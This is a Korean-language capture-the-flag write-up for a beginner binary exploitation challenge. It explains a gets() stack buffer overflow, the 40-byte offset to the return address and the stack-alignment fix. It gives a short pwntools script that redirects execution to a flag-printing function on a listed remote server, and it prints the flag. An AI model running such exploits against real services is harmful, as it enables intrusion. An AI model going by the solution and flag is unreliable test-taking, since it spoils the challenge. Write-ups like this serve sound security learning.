---
ctf_name: "RIFFHACK: Black Market Break-In"
challenge_name: "Samus Stack Smash"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "minyoung13"
date: "2026-06-22"
points: 50
tags: [bof, ret2win]
---

# Samus Stack Smash

## 문제 설명

> A Federation checkpoint AI loops the same authorization prompt while a damaged Chozo console hums behind it. Push past the guard and see what the access vault is hiding.

- 첨부파일 : 'samus_stack_smash' (ELF 바이너리)

## 풀이

### 분석

1. `file`, `checksec` 명령어로 확인한 결과, 64-bit ELF 파일이며 No PIE, not stripped 상태였다.
2. Ghidra로 바이너리를 로드하고 Auto Analysis를 수행한 결과 주요 함수는 main, vuln, mission_clear 였다.

3. main 함수 분석
- vuln() 함수를 호출한 후 "Signal lost." 문자열을 출력하고 종료된다.

4. vuln 함수 분석
- 사용자 입력을 받아 출력하는 단순한 함수이다.
- gets()로 입력 받기 때문에 버퍼 크기(32바이트)를 초과하는 데이터를 입력하는 경우 스택 버퍼 오버플로우가 발생한다.

5. mission_clear 함수 분석
- flag.txt 파일을 열고, 여는 데 성공하면 플래그를 읽어와 출력한다.
- 정상적인 실행 흐름에서 호출되는 부분은 없으나, 프로그램의 실행 흐름을 mission_clear로 변경할 수 있다면 플래그를 획득할 수 있다.


### 취약점

gets()는 입력 길이에 대한 검사를 수행하지 않으므로, 사용자가 버퍼 크기보다 긴 데이터를 입력하면 인접한 스택 영역을 덮어쓸 수 있다.
이를 이용해 저장된 RIP(Return Instruction Pointer)를 덮어쓰고 프로그램의 실행 흐름을 변경할 수 있다.

vuln 함수의 스택 구조는 다음과 같다.
```
buf[32]
saved RBP (8 bytes)
RIP (return address)
```
버퍼 크기는 32바이트이며, 그 뒤에 저장된 RBP가 8바이트 존재한다.
따라서 반환 주소(RIP)를 덮기 위해 필요한 오프셋은 32 + 8 = 40 bytes 이다.
즉, b"A" * 40 을 입력하면 RIP를 제어할 수 있다.

### 익스플로잇

심볼 정보를 통해 mission_clear 함수의 주소를 확인하였다. (0x401216 : mission_clear)

스택 정렬이 깨지는 문제를 해결하기 위해 ret 가젯을 하나 추가하였다. (0x40101a : ret)


```python
from pwn import *

p = remote("143.198.170.82", 1337)

payload  = b"A"*40
payload += p64(0x40101a)   # ret
payload += p64(0x401216)   # mission_clear

p.sendline(payload)
p.interactive()
```

## 플래그

```
bitctf{{m37r01d_57ack_0v3rrun}}
```

## 배운 점

- PIE가 비활성화되어 있어 함수 주소가 고정되어 있으므로, mission_clear의 주소를 직접 사용할 수 있었다.
- gets()는 입력 길이 검사를 수행하지 않아 버퍼 오버플로우 취약점이 발생할 수 있다.
- 첫번째 시도에서 다음과 같이 RIP를 mission_clear로 덮어쓰는 페이로드를 작성하였으나 함수 진입 후 프로그램이 종료되었다.

``` python
payload = b"A"*40
payload += p64(0x401216)
```

x86-64 System V ABI에서는 함수 호출 시 스택이 16바이트 정렬되어 있어야 하므로, ret 가젯을 추가하여 해결할 수 있음을 알게 되었다.